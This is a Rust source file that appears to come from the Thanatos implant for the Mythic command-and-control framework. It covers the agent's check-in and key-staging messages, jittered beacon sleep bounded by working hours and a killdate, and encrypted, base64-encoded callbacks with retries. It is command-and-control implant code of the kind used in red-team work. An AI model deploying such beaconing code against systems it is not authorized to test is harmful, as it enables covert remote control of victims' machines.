mod checkin;
pub mod errors;
mod initialized;
mod running;
mod uninitialized;
mod workinghours;

use std::{
    marker::PhantomData,
    time::{Duration, SystemTime},
};

use serde::{Deserialize, Serialize};

use crate::{
    crypto::{base64, decrypt_message, encrypt_message, errors::CryptoError, xoshiro::Xoshiross},
    errors::ThanatosError,
    native,
    profiles::HttpProfile,
    utils::consts::MAX_WORKING_END_DURATION,
};

use self::{
    errors::AgentError,
    initialized::{CheckinMessage, StagingRsaMessage, StagingRsaResponse},
    traits::{AgentState, BeaconingState},
};

pub mod traits {
    pub(super) mod private {
        pub trait Sealed {}
    }

    pub trait AgentState: private::Sealed {}
    pub trait BeaconingState: private::Sealed + AgentState {}
}

#[derive(Serialize, Deserialize, PartialEq)]
pub enum MythicStatus {
    #[serde(rename = "success")]
    Success,

    #[serde(rename = "error")]
    Error,
}

#[derive(Serialize)]
#[serde(tag = "action")]
pub enum MythicMessage<'a> {
    #[serde(rename = "staging_rsa")]
    StagingRsa(StagingRsaMessage<'a>),

    Checkin(CheckinMessage),
}

#[derive(Deserialize)]
#[serde(tag = "action")]
pub enum MythicResponse {
    #[serde(rename = "staging_rsa")]
    StagingRsa(StagingRsaResponse),

    Checkin {
        id: String,
        status: MythicStatus,
    },
}

pub struct Agent<State: AgentState> {
    uuid: String,
    connection_retries: usize,
    working_start: Duration,
    working_end: Duration,
    killdate: SystemTime,
    callback_jitter: u32,
    callback_interval: u32,
    aes_key: Option<[u8; 32]>,
    profile: HttpProfile,

    /// Fast, non cryptographically secure, PRNG for calculating sleep jitter
    /// and creating the session id for the key exchange
    rng: Xoshiross,

    _s: PhantomData<State>,
}

impl<State: AgentState> Agent<State> {
    pub fn check_killdate(&self) -> Result<(), ThanatosError> {
        if SystemTime::now() >= self.killdate {
            return Err(ThanatosError::Agent(AgentError::PastKilldate))?;
        }

        Ok(())
    }

    pub fn sleep(&mut self) -> Result<(), ThanatosError> {
        self.check_killdate()?;

        // Sleep interval is zero and the working hours are not set so there
        // is no need to sleep
        if self.callback_interval == 0
            && self.working_start.is_zero()
            && self.working_end != MAX_WORKING_END_DURATION
        {
            return Ok(());
        }

        // Get the current time of day
        let tod = native::get_timeofday();

        // Calculate the amount of time until the killdate
        let time_to_killdate = self
            .killdate
            .duration_since(SystemTime::now())
            .map_err(|_| ThanatosError::SystemTimeError)?;

        let mut sleep_time = Duration::from_secs(
            if self.callback_interval != 0 {
                // Calculate the sleep jitter
                let jitter_value = if self.callback_jitter > 0 {
                    (self.callback_interval * (self.rng.next_val() as u32 % self.callback_jitter))
                        / 100
                } else {
                    0
                };

                // Calculate the sleep time with the jitter
                if self.rng.next_val() & 1 == 0 {
                    self.callback_interval + jitter_value
                } else {
                    self.callback_interval - jitter_value
                }
            } else {
                0
            }
            .into(),
        );

        if tod >= self.working_end {
            sleep_time += MAX_WORKING_END_DURATION - tod + self.working_start;
        } else if tod < self.working_start {
            sleep_time += self.working_start - tod;
        }

        // The next check in time is going to be past the killdate.
        // Just exit early here since there's no point in sleeping until
        // the killdate only for the agent to immediately exit.
        if time_to_killdate <= sleep_time {
            return Err(ThanatosError::Agent(AgentError::PastKilldate));
        }

        if !sleep_time.is_zero() {
            std::thread::sleep(sleep_time);
        }

        self.check_killdate()?;
        Ok(())
    }
}

impl<State: BeaconingState> Agent<State> {
    pub fn try_send(&mut self, message: MythicMessage) -> Result<MythicResponse, ThanatosError> {
        let data = serde_json::to_vec(&message).map_err(ThanatosError::Json)?;

        let mut data = match self.aes_key {
            Some(ref key) => encrypt_message(key, data).map_err(ThanatosError::Crypto)?,
            None => data,
        };

        let mut full_message = self.uuid.as_bytes().to_vec();
        full_message.append(&mut data);

        let encoded_message = base64::encode(full_message);

        for _ in 0..=self.connection_retries {
            if let Ok(value) = self.profile.send_data(encoded_message.as_bytes()) {
                let data = base64::decode(
                    std::str::from_utf8(&value).map_err(|_| ThanatosError::InvalidString)?,
                )
                .map_err(|e| ThanatosError::Crypto(CryptoError::Base64(e)))?;

                let data = match self.aes_key {
                    Some(ref key) => decrypt_message(key, data).map_err(ThanatosError::Crypto)?,
                    None => data,
                };

                return Ok(serde_json::from_slice(&data[36..]).map_err(ThanatosError::Json)?);
            }

            self.sleep()?;
        }

        Err(ThanatosError::Agent(AgentError::RetryLimitReached))
    }
}
